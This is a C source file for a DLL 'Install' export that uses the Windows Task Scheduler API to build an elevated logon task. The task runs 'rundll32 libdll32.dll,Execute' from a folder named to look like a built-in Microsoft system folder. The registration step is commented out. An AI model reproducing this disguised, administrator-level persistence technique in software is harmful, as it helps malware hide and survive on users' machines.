#include "definition.h"

#define TASK_FOLDER_NAME L"Microsoft\\Windows\\Registry"
#define FILE_NAME L"libdll32.dll"
#define FUNCTION_NAME L"Execute"
#define RUNDLL32PATH L"System32\\rundll32.exe"

EXPORT(Install) {
	HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);

	if(FAILED(result)) {
		dialogError(result, L"CoInitializeEx");
		return;
	}

	result = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);

	if(FAILED(result)) {
		dialogError(result, L"CoInitializeSecurity");
		goto uninitializeExit;
	}

	ITaskService* taskService = NULL;
	result = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, &taskService);

	if(FAILED(result)) {
		dialogError(result, L"CoCreateInstance");
		goto uninitializeExit;
	}

	VARIANT emptyVariant = {VT_EMPTY};
	result = taskService->lpVtbl->Connect(taskService, emptyVariant, emptyVariant, emptyVariant, emptyVariant);

	if(FAILED(result)) {
		dialogError(result, L"ITaskService::Connect");
		goto releaseTaskService;
	}

	ITaskFolder* rootFolder = NULL;
	result = taskService->lpVtbl->GetFolder(taskService, L"\\", &rootFolder);

	if(FAILED(result)) {
		dialogError(result, L"ITaskService::GetFolder");
		goto releaseTaskService;
	}

	ITaskFolder* taskFolder = NULL;
	result = rootFolder->lpVtbl->CreateFolder(rootFolder, TASK_FOLDER_NAME, emptyVariant, &taskFolder);

	if(result == 0x800700B7) {
		result = rootFolder->lpVtbl->GetFolder(rootFolder, TASK_FOLDER_NAME, &taskFolder);
		rootFolder->lpVtbl->Release(rootFolder);

		if(FAILED(result)) {
			dialogError(result, L"ITaskFolder::GetFolder");
			goto releaseTaskService;
		}
	} else {
		rootFolder->lpVtbl->Release(rootFolder);

		if(FAILED(result)) {
			dialogError(result, L"ITaskFolder::CreateFolder");
			goto releaseTaskService;
		}
	}

	ITaskDefinition* taskDefinition = NULL;
	result = taskService->lpVtbl->NewTask(taskService, 0, &taskDefinition);

	if(FAILED(result)) {
		dialogError(result, L"ITaskService::NewTask");
		goto releaseTaskFolder;
	}
	
	IPrincipal* principal = NULL;
	result = taskDefinition->lpVtbl->get_Principal(taskDefinition, &principal);

	if(FAILED(result)) {
		dialogError(result, L"ITaskDefinition::get_Principal");
		goto releaseTaskDefinition;
	}

	result = principal->lpVtbl->put_RunLevel(principal, TASK_RUNLEVEL_HIGHEST);

	if(FAILED(result)) {
		dialogError(result, L"IPrincipal::put_RunLevel");
		goto releasePrincipal;
	}

	result = principal->lpVtbl->put_UserId(principal, L"S-1-5-32-544");

	if(FAILED(result)) {
		dialogError(result, L"IPrincipal::put_UserId");
		goto releasePrincipal;
	}
	
	ITriggerCollection* triggerCollection = NULL;
	result = taskDefinition->lpVtbl->get_Triggers(taskDefinition, &triggerCollection);

	if(FAILED(result)) {
		dialogError(result, L"ITaskDefinition::get_Triggers");
		goto releasePrincipal;
	}

	ITrigger* trigger = NULL;
	result = triggerCollection->lpVtbl->Create(triggerCollection, TASK_TRIGGER_LOGON, &trigger);
	triggerCollection->lpVtbl->Release(triggerCollection);

	if(FAILED(result)) {
		dialogError(result, L"ITriggerCollection::Create");
		goto releasePrincipal;
	}

	trigger->lpVtbl->Release(trigger);
	UINT directoryLength = GetWindowsDirectoryW(NULL, 0);

	if(!directoryLength) {
		dialogError(GetLastError(), L"GetWindowsDirectoryW");
		goto releasePrincipal;
	}

	wchar_t* windowsBuffer = malloc(directoryLength * sizeof(wchar_t));

	if(!windowsBuffer) {
		dialogError(ERROR_OUTOFMEMORY, L"malloc");
		goto releasePrincipal;
	}

	directoryLength = GetWindowsDirectoryW(windowsBuffer, directoryLength);

	if(!directoryLength) {
		dialogError(GetLastError(), L"GetWindowsDirectoryW");
		free(windowsBuffer);
		goto releasePrincipal;
	}

	size_t fileNameLength = wcslen(RUNDLL32PATH);
	int notEndWithBackslash = windowsBuffer[directoryLength - 1] != L'\\';
	size_t rundll32PathBufferSize = directoryLength + fileNameLength + notEndWithBackslash + 1;
	wchar_t* rundll32PathBuffer = malloc(rundll32PathBufferSize * sizeof(wchar_t));

	if(!rundll32PathBuffer) {
		dialogError(ERROR_OUTOFMEMORY, L"malloc");
		free(windowsBuffer);
		goto releasePrincipal;
	}

	for(size_t i = 0; i < directoryLength; i++) {
		rundll32PathBuffer[i] = windowsBuffer[i];
	}

	free(windowsBuffer);

	if(notEndWithBackslash) {
		rundll32PathBuffer[directoryLength] = L'\\';
	}

	for(size_t i = 0; i < fileNameLength; i++) {
		rundll32PathBuffer[i + directoryLength + notEndWithBackslash] = RUNDLL32PATH[i];
	}

	rundll32PathBuffer[rundll32PathBufferSize - 1] = 0;
	fileNameLength = wcslen(FILE_NAME);
	size_t functionNameLength = wcslen(FUNCTION_NAME);
	size_t functionBufferSize = fileNameLength + 1 + functionNameLength + 1;
	wchar_t* functionBuffer = malloc(functionBufferSize * sizeof(wchar_t));

	if(!functionBuffer) {
		dialogError(ERROR_OUTOFMEMORY, L"malloc");
		goto freeRundll32PathBuffer;
	}

	for(size_t i = 0; i < fileNameLength; i++) {
		functionBuffer[i] = FILE_NAME[i];
	}
	
	functionBuffer[fileNameLength] = L',';

	for(size_t i = 0; i < functionNameLength; i++) {
		functionBuffer[i + fileNameLength + 1] = FUNCTION_NAME[i];
	}

	functionBuffer[functionBufferSize - 1] = 0;
	IActionCollection* actionCollection = NULL;
	result = taskDefinition->lpVtbl->get_Actions(taskDefinition, &actionCollection);

	if(FAILED(result)) {
		dialogError(result, L"ITaskDefinition::get_Actions");
		goto freeFunctionBuffer;
	}

	IAction* action = NULL;
	result = actionCollection->lpVtbl->Create(actionCollection, TASK_ACTION_EXEC, &action);
	actionCollection->lpVtbl->Release(actionCollection);

	if(FAILED(result)) {
		dialogError(result, L"IActionCollection::Create");
		goto freeFunctionBuffer;
	}

	IExecAction* executeAction = NULL;
	result = action->lpVtbl->QueryInterface(action, &IID_IExecAction, &executeAction);
	action->lpVtbl->Release(action);

	if(FAILED(result)) {
		dialogError(result, L"IAction::QueryInterface");
		goto freeFunctionBuffer;
	}

	result = executeAction->lpVtbl->put_Path(executeAction, rundll32PathBuffer);

	if(FAILED(result)) {
		dialogError(result, L"IExecAction::put_Path");
		executeAction->lpVtbl->Release(executeAction);
		goto freeFunctionBuffer;
	}

	result = executeAction->lpVtbl->put_Arguments(executeAction, functionBuffer);
	executeAction->lpVtbl->Release(executeAction);

	if(FAILED(result)) {
		dialogError(result, L"IExecAction::put_Arguments");
		goto freeFunctionBuffer;
	}

	//HI_SetActions(folder, definition, rundll32, programArgument.c_str());
	/*HI_SetSettings(folder, definition);
	HI_RegisterTask(folder, definition, L"Startup");
	definition->Release();
	folder->Release();*/
	MessageBoxW(NULL, L"Status: OK", L"Information", MB_OK | MB_DEFBUTTON1 | MB_ICONINFORMATION | MB_SYSTEMMODAL);
freeFunctionBuffer:
	free(functionBuffer);
freeRundll32PathBuffer:
	free(rundll32PathBuffer);
releasePrincipal:
	principal->lpVtbl->Release(principal);
releaseTaskDefinition:
	taskDefinition->lpVtbl->Release(taskDefinition);
releaseTaskFolder:
	taskFolder->lpVtbl->Release(taskFolder);
releaseTaskService:
	taskService->lpVtbl->Release(taskService);
uninitializeExit:
	CoUninitialize();
}
